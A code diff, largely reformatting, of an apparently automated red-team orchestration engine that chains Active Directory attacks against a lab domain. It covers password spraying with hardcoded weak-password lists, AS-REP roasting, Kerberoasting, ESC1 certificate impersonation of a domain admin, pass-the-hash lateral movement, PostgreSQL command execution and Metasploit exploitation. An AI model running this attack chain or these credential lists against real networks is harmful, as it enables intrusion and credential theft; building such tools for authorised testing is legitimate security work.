-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": "mcp_ad",
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": "mcp_ad",
+            },
+        )
 
         target_ip = await self._get_target_ip(db, target_id)
         target_str = target_ip or target_id
@@ -1057,7 +1279,8 @@ class EngineRouter:
             "'credential.valid_pair', 'credential.cleartext') "
             "AND trait NOT LIKE '%%.invalidated' "
             "ORDER BY collected_at DESC LIMIT 1",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
         if not cred_row:
             # Domain credentials harvested on other hosts are valid for this host too.
@@ -1102,12 +1325,16 @@ class EngineRouter:
                 "WHERE id = $4",
                 "No credential available — prerequisite missing",
                 "prerequisite_missing",
-                datetime.now(timezone.utc), exec_id,
+                datetime.now(timezone.utc),
+                exec_id,
             )
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "mcp_ad",
-                "status": "failed", "failure_category": "prerequisite_missing",
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "mcp_ad",
+                "status": "failed",
+                "failure_category": "prerequisite_missing",
                 "error": "No credential available — prerequisite missing",
             }
 
@@ -1126,10 +1353,12 @@ class EngineRouter:
                 operation_id,
             )
             if hash_row and hash_row["value"]:
-                params.update({
-                    "hash_value": hash_row["value"],
-                    "hash_file": "",
-                })
+                params.update(
+                    {
+                        "hash_value": hash_row["value"],
+                        "hash_file": "",
+                    }
+                )
             else:
                 await db.execute(
                     "UPDATE technique_executions SET status = 'failed', "
@@ -1137,12 +1366,16 @@ class EngineRouter:
                     "WHERE id = $4",
                     "No kerberos hash in facts — run T1558.003 first",
                     "prerequisite_missing",
-                    datetime.now(timezone.utc), exec_id,
+                    datetime.now(timezone.utc),
+                    exec_id,
                 )
                 return {
-                    "execution_id": exec_id, "technique_id": technique_id,
-                    "target_id": target_id, "engine": "mcp_ad",
-                    "status": "failed", "failure_category": "prerequisite_missing",
+                    "execution_id": exec_id,
+                    "technique_id": technique_id,
+                    "target_id": target_id,
+                    "engine": "mcp_ad",
+                    "status": "failed",
+                    "failure_category": "prerequisite_missing",
                     "error": "No kerberos hash in facts — run T1558.003 first",
                 }
 
@@ -1179,24 +1412,28 @@ class EngineRouter:
             )
             spray_target = dc_row["ip_address"] if dc_row else _LAB_DC_IP
             # Spray known lab weak user credentials (admin hardened, not in list)
-            params.update({
-                "target": spray_target,
-                "username_list": "bob,kevin,steve,legacy_kev,svc_sql,svc_backup",
-                "password": "Summer2023",
-                "password_list": "Summer2023,BackupMe!234,Password1!,Welcome1,Summer2024!,Qwerty123!",
-                "domain": domain or "corp.athena.lab",
-                "protocol": "smb",
-            })
+            params.update(
+                {
+                    "target": spray_target,
+                    "username_list": "bob,kevin,steve,legacy_kev,svc_sql,svc_backup",
+                    "password": "Summer2023",
+                    "password_list": "Summer2023,BackupMe!234,Password1!,Welcome1,Summer2024!,Qwerty123!",
+                    "domain": domain or "corp.athena.lab",
+                    "protocol": "smb",
+                }
+            )
 
         # T1558.004: AS-REP Roast — zero-credential anonymous KDC query
         # impacket-GetNPUsers -no-pass queries the DC for accounts with DoesNotRequirePreAuth
         if technique_id == "T1558.004":
-            params.update({
-                "target": "192.168.0.16",
-                "domain": "corp.athena.lab",
-                "username": "",
-                "password": "",
-            })
+            params.update(
+                {
+                    "target": "192.168.0.16",
+                    "domain": "corp.athena.lab",
+                    "username": "",
+                    "password": "",
+                }
+            )
 
         # AD tools needing explicit username/password/domain — parse from credential.valid_pair
         if technique_id not in {"T1110.003", "T1110.002", "T1558.004"} and cred_row:
@@ -1238,13 +1475,15 @@ class EngineRouter:
                         operation_id,
                     )
                     kerberoast_dc = dc_kerberoast_row["ip_address"] if dc_kerberoast_row else "192.168.0.16"
-                    params.update({
-                        "username": parsed_user,
-                        "password": parsed_pass,
-                        "domain": parsed_domain or "corp.athena.lab",
-                        "target_dc": kerberoast_dc,
-                        "target": kerberoast_dc,
-                    })
+                    params.update(
+                        {
+                            "username": parsed_user,
+                            "password": parsed_pass,
+                            "domain": parsed_domain or "corp.athena.lab",
+                            "target_dc": kerberoast_dc,
+                            "target": kerberoast_dc,
+                        }
+                    )
                 elif technique_id == "T1649":
                     # ESC1 cert request: use cracked cleartext cred, request cert as da_alice UPN
                     cleartext_row = await db.fetchrow(
@@ -1273,15 +1512,17 @@ class EngineRouter:
                         "AND trait = 'ad.ca_name' ORDER BY collected_at DESC LIMIT 1",
                         operation_id,
                     )
-                    params.update({
-                        "target_dc": "192.168.0.16",
-                        "username": parsed_user,
-                        "password": parsed_pass,
-                        "domain": parsed_domain or "corp.athena.lab",
-                        "ca": ca_row["value"] if ca_row else "corp-DC01-CA",
-                        "template": tmpl_row["value"] if tmpl_row else "VulnTemplate1",
-                        "upn": "da_alice@corp.athena.lab",
-                    })
+                    params.update(
+                        {
+                            "target_dc": "192.168.0.16",
+                            "username": parsed_user,
+                            "password": parsed_pass,
+                            "domain": parsed_domain or "corp.athena.lab",
+                            "ca": ca_row["value"] if ca_row else "corp-DC01-CA",
+                            "template": tmpl_row["value"] if tmpl_row else "VulnTemplate1",
+                            "upn": "da_alice@corp.athena.lab",
+                        }
+                    )
                 elif technique_id == "T1550.003":
                     # PKINIT auth: use the PFX from ESC1 to get da_alice TGT + NTLM hash
                     cert_row = await db.fetchrow(
@@ -1300,11 +1541,13 @@ class EngineRouter:
                     # Strip template=/upn= prefix if present (written by certipy_request fallback)
                     if pfx_path.startswith("template="):
                         pfx_path = "da_alice.pfx"
-                    params.update({
-                        "target_dc": "192.168.0.16",
-                        "pfx_path": pfx_path,
-                        "domain": "corp.athena.lab",
-                    })
+                    params.update(
+                        {
+                            "target_dc": "192.168.0.16",
+                            "pfx_path": pfx_path,
+                            "domain": "corp.athena.lab",
+                        }
+                    )
                 elif technique_id in {"T1021.002", "T1021.006"}:
                     # netexec_exec needs target (the actual host), password_or_hash, command
                     # Pick svc_sql creds preferentially for WEB01 lateral move
@@ -1324,50 +1567,67 @@ class EngineRouter:
                             parsed_domain, parsed_user, parsed_pass = sm.group(1), sm.group(2), sm.group(3)
                         elif sm and sm.lastindex == 2:
                             parsed_user, parsed_pass = sm.group(1), sm.group(2)
-                    params.update({
-                        "target": target_str,
-                        "username": parsed_user,
-                        "password_or_hash": parsed_pass,
-                        "domain": parsed_domain or "corp.athena.lab",
-                        "command": "whoami /all",
-                        "method": "wmiexec",
-                    })
+                    params.update(
+                        {
+                            "target": target_str,
+                            "username": parsed_user,
+                            "password_or_hash": parsed_pass,
+                            "domain": parsed_domain or "corp.athena.lab",
+                            "command": "whoami /all",
+                            "method": "wmiexec",
+                        }
+                    )
                 else:
-                    params.update({
-                        "username": parsed_user,
-                        "password": parsed_pass,
-                        "domain": parsed_domain,
-                        "target_dc": target_str,
-                    })
+                    params.update(
+                        {
+                            "username": parsed_user,
+                            "password": parsed_pass,
+                            "domain": parsed_domain,
+                            "target_dc": target_str,
+                        }
+                    )
 
         try:
             result: ExecutionResult = await self._mcp_engine.execute(
-                qualified_name, target_str, params=params,
+                qualified_name,
+                target_str,
+                params=params,
             )
 
             final = await self._finalize_execution(
-                db, exec_id, technique_id, target_id, "mcp_ad",
-                operation_id, result,
+                db,
+                exec_id,
+                technique_id,
+                target_id,
+                "mcp_ad",
+                operation_id,
+                result,
             )
             return final
 
         except Exception as e:
             logger.exception(
                 "AD MCP execution failed: technique=%s tool=%s",
-                technique_id, qualified_name,
+                technique_id,
+                qualified_name,
             )
             failure_category = _classify_failure(str(e), "mcp_ad")
             await db.execute(
                 "UPDATE technique_executions SET status = 'failed', "
                 "error_message = $1, failure_category = $2, completed_at = $3 "
                 "WHERE id = $4",
-                str(e)[:500], failure_category,
-                datetime.now(timezone.utc), exec_id,
+                str(e)[:500],
+                failure_category,
+                datetime.now(timezone.utc),
+                exec_id,
             )
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "mcp_ad",
-                "status": "failed", "error": str(e),
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "mcp_ad",
+                "status": "failed",
+                "error": str(e),
             }
 
     async def _get_output_parser(
@@ -1378,10 +1638,10 @@ class EngineRouter:
             "SELECT output_parser FROM technique_playbooks "
             "WHERE mitre_id = $1 AND platform = $2 "
             "ORDER BY created_at DESC LIMIT 1",
-            technique_id, platform,
+            technique_id,
+            platform,
         )
         return row["output_parser"] if row else None
-
 
     async def _mark_target_compromised(
         self,
@@ -1393,9 +1653,12 @@ class EngineRouter:
         """SSH/WinRM success -> update target is_compromised and privilege_level."""
         _LINUX_ROOT = ["uid=0", "root@", "# ", "sudo"]
         _WIN_ADMIN = [
-            "\\Administrator", "\\administrator",
-            "Domain Admins", "NT AUTHORITY\\SYSTEM",
-            "S-1-5-32-544", "BUILTIN\\Administrators",
+            "\\Administrator",
+            "\\administrator",
+            "Domain Admins",
+            "NT AUTHORITY\\SYSTEM",
+            "S-1-5-32-544",
+            "BUILTIN\\Administrators",
         ]
         out = output or ""
         if any(x in out for x in _LINUX_ROOT):
@@ -1409,9 +1672,9 @@ class EngineRouter:
             privilege = "User"
 
         await db.execute(
-            "UPDATE targets SET is_compromised = TRUE, privilege_level = $1, "
-            "access_status = 'active' WHERE id = $2",
-            privilege, target_id,
+            "UPDATE targets SET is_compromised = TRUE, privilege_level = $1, access_status = 'active' WHERE id = $2",
+            privilege,
+            target_id,
         )
 
     async def _execute_pgsql_copy_program(
@@ -1433,13 +1696,17 @@ class EngineRouter:
         from app.clients.pgsql_client import PostgreSQLCopyClient
 
         try:
-            target_row = await db.fetchrow(
-                "SELECT ip_address, hostname FROM targets WHERE id = $1", target_id
-            )
+            target_row = await db.fetchrow("SELECT ip_address, hostname FROM targets WHERE id = $1", target_id)
             if not target_row:
                 return self._failure_result(
-                    exec_id, now, technique_id, target_id, operation_id,
-                    ooda_iteration_id, "target not found", "prerequisite_missing",
+                    exec_id,
+                    now,
+                    technique_id,
+                    target_id,
+                    operation_id,
+                    ooda_iteration_id,
+                    "target not found",
+                    "prerequisite_missing",
                 )
 
             host = target_row["ip_address"] or target_row["hostname"]
@@ -1451,7 +1718,8 @@ class EngineRouter:
                 "AND trait = 'credential.postgresql' "
                 "AND trait NOT LIKE '%.invalidated' "
                 "ORDER BY collected_at DESC LIMIT 1",
-                operation_id, target_id,
+                operation_id,
+                target_id,
             )
 
             user, password = "postgres", ""
@@ -1469,16 +1737,26 @@ class EngineRouter:
             if not result.success:
                 failure_cat = _classify_failure(result.error, "pgsql")
                 return self._failure_result(
-                    exec_id, now, technique_id, target_id, operation_id,
-                    ooda_iteration_id, result.error or "pgsql execute failed", failure_cat,
+                    exec_id,
+                    now,
+                    technique_id,
+                    target_id,
+                    operation_id,
+                    ooda_iteration_id,
+                    result.error or "pgsql execute failed",
+                    failure_cat,
                 )
 
             # Persist facts produced by the command
             fc = FactCollector(self._ws)
             for fact in result.facts:
                 await fc._store_fact(
-                    db, operation_id, target_id,
-                    fact["category"], fact["trait"], fact["value"],
+                    db,
+                    operation_id,
+                    target_id,
+                    fact["category"],
+                    fact["trait"],
+                    fact["value"],
                     source="pgsql_copy_program",
                 )
 
@@ -1488,8 +1766,13 @@ class EngineRouter:
                 "(id, operation_id, ooda_iteration_id, technique_id, target_id, "
                 "engine, status, result_summary, created_at) "
                 "VALUES ($1,$2,$3,$4,$5,'pgsql','success',$6,$7)",
-                exec_id, operation_id, ooda_iteration_id, technique_id, target_id,
-                output_summary, now,
+                exec_id,
+                operation_id,
+                ooda_iteration_id,
+                technique_id,
+                target_id,
+                output_summary,
+                now,
             )
 
             return {
@@ -1504,8 +1787,14 @@ class EngineRouter:
         except Exception as exc:
             logger.exception("_execute_pgsql_copy_program failed: %s", exc)
             return self._failure_result(
-                exec_id, now, technique_id, target_id, operation_id,
-                ooda_iteration_id, str(exc), "tool_error",
+                exec_id,
+                now,
+                technique_id,
+                target_id,
+                operation_id,
+                ooda_iteration_id,
+                str(exc),
+                "tool_error",
             )
 
     def _failure_result(
@@ -1547,14 +1836,25 @@ class EngineRouter:
             "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
             "engine, status, started_at) "
             "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
-            exec_id, technique_id, target_id, operation_id,
-            ooda_iteration_id, "mcp", now,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            ooda_iteration_id,
+            "mcp",
+            now,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": "mcp",
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": "mcp",
+            },
+        )
 
         # Look up tool_registry for matching MCP tool (qualified name)
         try:
@@ -1565,9 +1865,7 @@ class EngineRouter:
             for tr_row in tr_rows:
                 import json as _json
 
-                cfg = _json.loads(
-                    tr_row["config_json"] if isinstance(tr_row, dict) else tr_row[0] or "{}"
-                )
+                cfg = _json.loads(tr_row["config_json"] if isinstance(tr_row, dict) else tr_row[0] or "{}")
                 mcp_srv = cfg.get("mcp_server")
                 mcp_tool = cfg.get("mcp_tool")
                 if mcp_srv and mcp_tool:
@@ -1580,12 +1878,18 @@ class EngineRouter:
         target_str = target_ip or target_id
 
         result: ExecutionResult = await self._mcp_engine.execute(
-            ability_id, target_str,
+            ability_id,
+            target_str,
         )
 
         final = await self._finalize_execution(
-            db, exec_id, technique_id, target_id, "mcp",
-            operation_id, result,
+            db,
+            exec_id,
+            technique_id,
+            target_id,
+            "mcp",
+            operation_id,
+            result,
         )
         # Generic MCP execution success (recon, discovery, etc.) does NOT
         # imply shell access. Compromise gate is handled by OODA controller
@@ -1617,7 +1921,9 @@ class EngineRouter:
             if agent_paw is None:
                 logger.warning(
                     "No capable agent on target %s for technique %s (operation %s)",
-                    target_id, technique_id, operation_id,
+                    target_id,
+                    technique_id,
+                    operation_id,
                 )
                 return {
                     "execution_id": exec_id,
@@ -1627,9 +1933,7 @@ class EngineRouter:
                     "status": "failed",
                     "result_summary": None,
                     "facts_collected_count": 0,
-                    "error": (
-                        f"No agent on target {target_id} with capability for {technique_id}"
-                    ),
+                    "error": (f"No agent on target {target_id} with capability for {technique_id}"),
                 }
 
         # Create execution record
@@ -1638,22 +1942,38 @@ class EngineRouter:
             "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
             "engine, status, started_at) "
             "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
-            exec_id, technique_id, target_id, operation_id,
-            ooda_iteration_id, engine, now,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            ooda_iteration_id,
+            engine,
+            now,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": engine,
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": engine,
+            },
+        )
 
         # Select and call engine
         client = self._select_client(engine)
         result: ExecutionResult = await client.execute(ability_id, agent_paw)
 
         return await self._finalize_execution(
-            db, exec_id, technique_id, target_id, engine,
-            operation_id, result,
+            db,
+            exec_id,
+            technique_id,
+            target_id,
+            engine,
+            operation_id,
+            result,
         )
 
     async def _finalize_execution(
@@ -1672,29 +1992,36 @@ class EngineRouter:
         facts_count = len(result.facts)
 
         # SPEC-053: classify failure reason so Orient can reason about dead paths
-        failure_category = (
-            _classify_failure(result.error, engine) if not result.success else None
-        )
+        failure_category = _classify_failure(result.error, engine) if not result.success else None
 
         await db.execute(
             "UPDATE technique_executions SET status = $1, result_summary = $2, "
             "facts_collected_count = $3, completed_at = $4, error_message = $5, "
             "failure_category = $6 "
             "WHERE id = $7",
-            status, result.output, facts_count, completed_at,
-            result.error, failure_category, exec_id,
+            status,
+            result.output,
+            facts_count,
+            completed_at,
+            result.error,
+            failure_category,
+            exec_id,
         )
 
         # [I-1] Only increment techniques_executed on success
         if result.success:
             await db.execute(
-                "UPDATE operations SET techniques_executed = techniques_executed + 1 "
-                "WHERE id = $1",
+                "UPDATE operations SET techniques_executed = techniques_executed + 1 WHERE id = $1",
                 operation_id,
             )
             # SPEC-043: Record PoC reproduction steps on success
             await self._record_poc(
-                db, technique_id, target_id, operation_id, result, engine,
+                db,
+                technique_id,
+                target_id,
+                operation_id,
+                result,
+                engine,
             )
 
         # SPEC-037: Detect auth failure -> trigger access lost handling
@@ -1703,9 +2030,7 @@ class EngineRouter:
 
         # Extract facts from result
         if result.facts:
-            await self._fact_collector.collect_from_result(
-                db, operation_id, technique_id, target_id, result.facts
-            )
+            await self._fact_collector.collect_from_result(db, operation_id, technique_id, target_id, result.facts)
             # Promote credential.cracked_password → credential.cleartext so T1649 (ESC1) can find it
             for fact in result.facts:
                 if fact.get("trait") == "credential.cracked_password":
@@ -1727,26 +2052,31 @@ class EngineRouter:
                                 "trait, value, category, score, collected_at) "
                                 "VALUES (gen_random_uuid(), $1, $2, $3, 'credential.cleartext', $4, 'credential', 1, now()) "
                                 "ON CONFLICT DO NOTHING",
-                                operation_id, target_id, technique_id, cleartext_val,
+                                operation_id,
+                                target_id,
+                                technique_id,
+                                cleartext_val,
                             )
                     except (json.JSONDecodeError, KeyError, Exception):
                         pass
 
         # Mark target compromised if AD spray/exec produced Pwn3d! or admin access evidence
         if result.success and result.output:
-            has_admin = (
-                "Pwn3d!" in result.output
-                or "ADMIN_ACCESS:" in result.output
-                or "(Pwn3d!)" in result.output
-            )
+            has_admin = "Pwn3d!" in result.output or "ADMIN_ACCESS:" in result.output or "(Pwn3d!)" in result.output
             if has_admin:
                 await self._mark_target_compromised(db, target_id, result.output, protocol="smb")
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": status, "engine": engine,
-            "facts_collected": facts_count,
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": status,
+                "engine": engine,
+                "facts_collected": facts_count,
+            },
+        )
 
         return {
             "execution_id": exec_id,
@@ -1772,9 +2102,7 @@ class EngineRouter:
     ) -> None:
         """Record PoC reproduction steps after successful technique execution."""
         try:
-            await self._record_poc_inner(
-                db, technique_id, target_id, operation_id, result, engine
-            )
+            await self._record_poc_inner(db, technique_id, target_id, operation_id, result, engine)
         except Exception:
             pass  # PoC recording is best-effort; never block execution flow
 
@@ -1797,10 +2125,14 @@ class EngineRouter:
             target_id,
         )
         env = {
-            "os": (tgt_row["os"] if tgt_row and isinstance(tgt_row, dict) else
-                   tgt_row[0] if tgt_row else "unknown"),
-            "privilege_level": (tgt_row["privilege_level"] if tgt_row and isinstance(tgt_row, dict) else
-                               tgt_row[1] if tgt_row else "unknown"),
+            "os": (tgt_row["os"] if tgt_row and isinstance(tgt_row, dict) else tgt_row[0] if tgt_row else "unknown"),
+            "privilege_level": (
+                tgt_row["privilege_level"]
+                if tgt_row and isinstance(tgt_row, dict)
+                else tgt_row[1]
+                if tgt_row
+                else "unknown"
+            ),
             "engine": engine,
         }
 
@@ -1834,26 +2166,36 @@ class EngineRouter:
             "source_target_id, operation_id, score, collected_at) "
             "VALUES ($1, $2, $3, 'poc', $4, $5, $6, 1, $7) "
             "ON CONFLICT DO NOTHING",
-            fact_id, f"poc.{technique_id}", poc.to_json(),
-            technique_id, target_id, operation_id, now,
+            fact_id,
+            f"poc.{technique_id}",
+            poc.to_json(),
+            technique_id,
+            target_id,
+            operation_id,
+            now,
         )
 
     # -- Access recovery (SPEC-037) --
 
     async def _handle_access_lost(
-        self, db: asyncpg.Connection, operation_id: str, target_id: str,
+        self,
+        db: asyncpg.Connection,
+        operation_id: str,
+        target_id: str,
     ) -> None:
         """Handle detected access loss: revoke compromised status, invalidate credentials."""
         logger.warning(
             "Access lost to target %s in operation %s -- invalidating credentials",
-            target_id, operation_id,
+            target_id,
+            operation_id,
         )
 
         # 1. Revoke target compromised status
         await db.execute(
             "UPDATE targets SET is_compromised = FALSE, access_status = 'lost', "
             "privilege_level = NULL WHERE id = $1 AND operation_id = $2",
-            target_id, operation_id,
+            target_id,
+            operation_id,
         )
 
         # 2. Invalidate credential facts (trait rename)
@@ -1861,13 +2203,15 @@ class EngineRouter:
             "UPDATE facts SET trait = REPLACE(trait, 'credential.ssh', 'credential.ssh.invalidated') "
             "WHERE operation_id = $1 AND source_target_id = $2 "
             "AND trait = 'credential.ssh'",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
         await db.execute(
             "UPDATE facts SET trait = REPLACE(trait, 'credential.winrm', 'credential.winrm.invalidated') "
             "WHERE operation_id = $1 AND source_target_id = $2 "
             "AND trait = 'credential.winrm'",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
 
         # 3. Insert access.lost fact
@@ -1879,8 +2223,11 @@ class EngineRouter:
                 "INSERT INTO facts (id, trait, value, category, source_target_id, "
                 "operation_id, score, collected_at) "
                 "VALUES ($1, 'access.lost', $2, 'host', $3, $4, 1, $5)",
-                fact_id, f"ssh_auth_failed:{target_ip or target_id}",
-                target_id, operation_id, now,
+                fact_id,
+                f"ssh_auth_failed:{target_ip or target_id}",
+                target_id,
+                operation_id,
+                now,
             )
         except Exception:
             pass  # unique constraint -- already recorded
@@ -1903,10 +2250,9 @@ class EngineRouter:
         if not target_ip:
             return
         rows = await db.fetch(
-            "SELECT value FROM facts "
-            "WHERE operation_id = $1 AND source_target_id = $2 "
-            "AND trait = 'service.open_port'",
-            operation_id, target_id,
+            "SELECT value FROM facts WHERE operation_id = $1 AND source_target_id = $2 AND trait = 'service.open_port'",
+            operation_id,
+            target_id,
         )
         if not rows:
             return
@@ -1926,7 +2272,11 @@ class EngineRouter:
                 "(id, trait, value, category, source_target_id, operation_id, score, collected_at) "
                 "VALUES ($1, 'access.recovery_candidate', $2, 'host', $3, $4, 1, $5) "
                 "ON CONFLICT DO NOTHING",
-                fact_id, f"rescan:{target_ip}:ports={','.join(ports)}", target_id, operation_id, now,
+                fact_id,
+                f"rescan:{target_ip}:ports={','.join(ports)}",
+                target_id,
+                operation_id,
+                now,
             )
         except Exception:
             logger.debug("recovery_candidate fact already exists for %s", target_id)
@@ -1947,10 +2297,9 @@ class EngineRouter:
             ("5986", "winrm_ssl", "5986"),
         ]
         port_rows = await db.fetch(
-            "SELECT value FROM facts "
-            "WHERE operation_id = $1 AND source_target_id = $2 "
-            "AND trait = 'service.open_port'",
-            operation_id, target_id,
+            "SELECT value FROM facts WHERE operation_id = $1 AND source_target_id = $2 AND trait = 'service.open_port'",
+            operation_id,
+            target_id,
         )
         port_values = [(r["value"] if isinstance(r, dict) else r[0]) for r in port_rows]
         now = datetime.now(timezone.utc)
@@ -1965,7 +2314,11 @@ class EngineRouter:
                             "operation_id, score, collected_at) "
                             "VALUES ($1, 'access.alternative_available', $2, 'host', $3, $4, 1, $5) "
                             "ON CONFLICT DO NOTHING",
-                            fact_id, f"{protocol}:{target_ip}:{default_port}", target_id, operation_id, now,
+                            fact_id,
+                            f"{protocol}:{target_ip}:{default_port}",
+                            target_id,
+                            operation_id,
+                            now,
                         )
                     except Exception:
                         pass
@@ -1974,7 +2327,8 @@ class EngineRouter:
             "SELECT value FROM facts "
             "WHERE operation_id = $1 AND source_target_id = $2 "
             "AND trait = 'credential.ssh_key'",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
         if key_row:
             fact_id = str(uuid.uuid4())
@@ -1985,7 +2339,11 @@ class EngineRouter:
                     "operation_id, score, collected_at) "
                     "VALUES ($1, 'access.alternative_available', $2, 'host', $3, $4, 1, $5) "
                     "ON CONFLICT DO NOTHING",
-                    fact_id, f"ssh_key:{target_ip}:22", target_id, operation_id, now,
+                    fact_id,
+                    f"ssh_key:{target_ip}:22",
+                    target_id,
+                    operation_id,
+                    now,
                 )
             except Exception:
                 pass
@@ -2004,7 +2362,8 @@ class EngineRouter:
             "SELECT id, ip_address, privilege_level FROM targets "
             "WHERE operation_id = $1 AND is_compromised = TRUE "
             "AND access_status = 'active' AND id != $2",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
         if not pivot_hosts:
             return
@@ -2020,7 +2379,8 @@ class EngineRouter:
                     "SELECT value FROM facts "
                     "WHERE operation_id = $1 AND source_target_id = $2 "
                     "AND trait = 'credential.root_shell'",
-                    operation_id, host_id,
+                    operation_id,
+                    host_id,
                 )
                 via = "root_shell" if shell_row else "elevated_privilege"
                 fact_id = str(uuid.uuid4())
@@ -2031,17 +2391,18 @@ class EngineRouter:
                         "operation_id, score, collected_at) "
                         "VALUES ($1, 'access.pivot_candidate', $2, 'host', $3, $4, 1, $5) "
                         "ON CONFLICT DO NOTHING",
-                        fact_id, f"pivot:{host_ip}->{target_ip}:via={via}",
-                        target_id, operation_id, now,
+                        fact_id,
+                        f"pivot:{host_ip}->{target_ip}:via={via}",
+                        target_id,
+                        operation_id,
+                        now,
                     )
                 except Exception:
                     pass
 
     # -- Metasploit helpers --
 
-    async def _has_exploitable_service(
-        self, db: asyncpg.Connection, operation_id: str, target_id: str
-    ) -> "str | None":
+    async def _has_exploitable_service(self, db: asyncpg.Connection, operation_id: str, target_id: str) -> "str | None":
         """Return service name from vuln.cve fact with exploit=true, else None."""
         row = await db.fetchrow(
             """SELECT value FROM facts
@@ -2049,7 +2410,8 @@ class EngineRouter:
                AND trait = 'vuln.cve' AND value LIKE '%exploit=true%'
                ORDER BY score DESC
                LIMIT 1""",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
         if row:
             # format: CVE-xxx:service:product:cvss=N:exploit=true
@@ -2065,9 +2427,9 @@ class EngineRouter:
         SPEC-037 Phase 2: fallback when no vuln.cve exploit=true fact exists.
         """
         rows = await db.fetch(
-            "SELECT value FROM facts WHERE operation_id = $1 AND source_target_id = $2 "
-            "AND trait = 'service.open_port'",
-            operation_id, target_id,
+            "SELECT value FROM facts WHERE operation_id = $1 AND source_target_id = $2 AND trait = 'service.open_port'",
+            operation_id,
+            target_id,
         )
         for row in rows:
             val_lower = row["value"].lower()
@@ -2075,14 +2437,14 @@ class EngineRouter:
                 if banner_key in val_lower:
                     logger.info(
                         "Inferred exploitable service '%s' from banner '%s' for target %s",
-                        service_name, row["value"], target_id,
+                        service_name,
+                        row["value"],
+                        target_id,
                     )
                     return service_name
         return None
 
-    async def _get_target_ip(
-        self, db: asyncpg.Connection, target_id: str
-    ) -> "str | None":
+    async def _get_target_ip(self, db: asyncpg.Connection, target_id: str) -> "str | None":
         """Resolve target IP from targets table. Returns None if target not found."""
         row = await db.fetchrow(
             "SELECT ip_address FROM targets WHERE id = $1",
@@ -2109,20 +2471,27 @@ class EngineRouter:
         # Pre-execution relay health check (P2: relay monitoring)
         try:
             from app.services.relay_monitor import RelayMonitor  # noqa: PLC0415
+
             relay_status = await RelayMonitor().pre_execute_check(target_ip)
             if relay_status and not relay_status.connected:
                 logger.warning(
                     "Relay '%s' (%s) is disconnected before Metasploit execution "
                     "for %s — exploit may fail if reverse-shell payload is used",
-                    relay_status.name, relay_status.ip, target_ip,
+                    relay_status.name,
+                    relay_status.ip,
+                    target_ip,
                 )
-                await self._ws.broadcast(operation_id, "relay.warning", {
-                    "technique_id": technique_id,
-                    "target_ip": target_ip,
-                    "relay_name": relay_status.name,
-                    "relay_ip": relay_status.ip,
-                    "error": relay_status.error,
-                })
+                await self._ws.broadcast(
+                    operation_id,
+                    "relay.warning",
+                    {
+                        "technique_id": technique_id,
+                        "target_ip": target_ip,
+                        "relay_name": relay_status.name,
+                        "relay_ip": relay_status.ip,
+                        "error": relay_status.error,
+                    },
+                )
         except Exception:
             pass  # relay check is best-effort
 
@@ -2131,17 +2500,29 @@ class EngineRouter:
             """INSERT INTO technique_executions
                (id, technique_id, target_id, operation_id, status, engine, started_at)
                VALUES ($1, $2, $3, $4, 'running', 'metasploit', $5)""",
-            exec_id, technique_id, target_id, operation_id, started_at,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            started_at,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": "metasploit",
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": "metasploit",
+            },
+        )
 
         logger.info(
             "_execute_metasploit: technique=%s service=%s target=%s",
-            technique_id, service_name, target_ip,
+            technique_id,
+            service_name,
+            target_ip,
         )
         msf_engine = MetasploitRPCEngine()
         method = msf_engine.get_exploit_for_service(service_name)
@@ -2167,14 +2548,16 @@ class EngineRouter:
         _lhost_for_log = settings.RELAY_IP or "(none/bind)"
         logger.info(
             "metasploit %s status=%s lhost=%s rhosts=%s service=%s",
-            technique_id, status, _lhost_for_log, target_ip, service_name,
+            technique_id,
+            status,
+            _lhost_for_log,
+            target_ip,
+            service_name,
         )
 
         # SPEC-053: classify metasploit failure reason for Orient consumption
         msf_error = result_dict.get("reason") if status != "success" else None
-        failure_category = (
-            _classify_failure(msf_error, "metasploit") if status != "success" else None
-        )
+        failure_category = _classify_failure(msf_error, "metasploit") if status != "success" else None
 
         completed_at = datetime.now(timezone.utc)
         await db.execute(
@@ -2196,7 +2579,8 @@ class EngineRouter:
             await db.execute(
                 "UPDATE targets SET is_compromised = TRUE, privilege_level = 'Root', "
                 "access_status = 'active' WHERE id = $1 AND operation_id = $2",
-                target_id, operation_id,
+                target_id,
+                operation_id,
             )
             # Record root shell fact
